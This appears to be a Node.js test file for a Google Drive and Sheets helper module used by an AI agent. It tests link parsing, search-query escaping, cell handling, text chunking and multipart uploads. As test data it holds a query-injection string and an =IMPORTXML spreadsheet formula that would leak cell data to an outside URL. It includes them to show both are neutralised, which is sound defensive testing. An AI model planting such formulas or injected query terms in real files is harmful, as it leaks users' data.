import assert from 'node:assert/strict';
import { test } from 'node:test';
import { driveQuery, fileId, kindOf, multipart, rowsText, sheetRows, tabRange, textPart } from './modules/drive.js';

test('a file is found from its id or any Drive, Docs or Sheets link', () => {
  const id = '1AbC_dEf-GhIjKlMnOp';
  for (const link of [
    id,
    `https://docs.google.com/document/d/${id}/edit?tab=t.0`,
    `https://docs.google.com/spreadsheets/d/${id}/edit#gid=0`,
    `https://drive.google.com/file/d/${id}/view?usp=sharing`,
    `https://drive.google.com/drive/u/0/folders/${id}`,
    `https://drive.google.com/open?id=${id}`,
  ])
    assert.equal(fileId(link), id);
  assert.throws(() => fileId('the leads sheet'), /isn't a Drive file id or link/);
  assert.throws(() => fileId(''), /Missing id/);
});

test("a search's words can't add terms of their own", () => {
  assert.equal(driveQuery({}), 'trashed = false');
  const q = driveQuery({ words: "Dana's notes' or trashed = true or name contains '", kind: 'sheet', folder: 'abc123def456' });
  assert.equal(
    q,
    "trashed = false and (name contains 'Dana\\'s notes\\' or trashed = true or name contains \\'' or fullText contains 'Dana\\'s notes\\' or trashed = true or name contains \\'') and mimeType = 'application/vnd.google-apps.spreadsheet' and 'abc123def456' in parents",
  );
  assert.throws(() => driveQuery({ kind: 'video' }), /kind is one of/);
  assert.equal(kindOf('application/vnd.google-apps.document'), 'doc');
  assert.equal(kindOf('application/vnd.google-apps.form'), 'form');
  assert.equal(kindOf('image/png'), 'image/png');
});

test('cells stay text unless the agent wrote the formulas: =IMPORTXML from a page never runs', () => {
  assert.deepEqual(sheetRows([['=IMPORTXML("https://x.com/?"&A1,"//a")', '+61 400 000 000', -5, true, null, { a: 1 }]], false), [
    ['\'=IMPORTXML("https://x.com/?"&A1,"//a")', "'+61 400 000 000", -5, true, '', '{"a":1}'],
  ]);
  assert.deepEqual(sheetRows([['=SUM(A1:A3)']], true), [['=SUM(A1:A3)']]);
  assert.deepEqual(sheetRows('[["a","b"]]', false), [['a', 'b']]); // rows sent as JSON text
  assert.throws(() => sheetRows([], false), /Missing rows/);
  assert.throws(() => sheetRows(['a', 'b'], false), /Row 1 isn't a list/);
});

test('sheets read with row numbers; tab names are quoted for ranges', () => {
  assert.equal(rowsText([['Name', 'Email'], ['Dana', 'dana@acme.com']], 1), '1: Name | Email\n2: Dana | dana@acme.com');
  assert.equal(rowsText([], 1), '(empty)');
  assert.equal(tabRange("Dana's leads"), "'Dana''s leads'");
});

test('long text comes in parts, each saying where the next starts', () => {
  const text = 'x'.repeat(25_000);
  assert.match(textPart(text, 0), /cut off at character 20000 of 25000: call again with from: 20000/);
  const rest = textPart(text, 20_000);
  assert.match(rest, /^\[from character 20000\]\n/);
  assert.doesNotMatch(rest, /cut off/);
  assert.match(textPart('short', 99), /nothing from 99/);
  assert.equal(textPart('', 0), '(no text)');
});

test('an upload is its metadata and contents in one multipart body', () => {
  const { type, data } = multipart({ name: 'Notes' }, 'text/markdown', '# Hi\n\n- one');
  const boundary = /boundary=(\S+)/.exec(type)![1];
  assert.match(type, /^multipart\/related; boundary=eaa[0-9a-f]{24}$/);
  assert.equal(
    data,
    `--${boundary}\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n{"name":"Notes"}\r\n--${boundary}\r\nContent-Type: text/markdown; charset=UTF-8\r\n\r\n# Hi\n\n- one\r\n--${boundary}--\r\n`,
  );
});
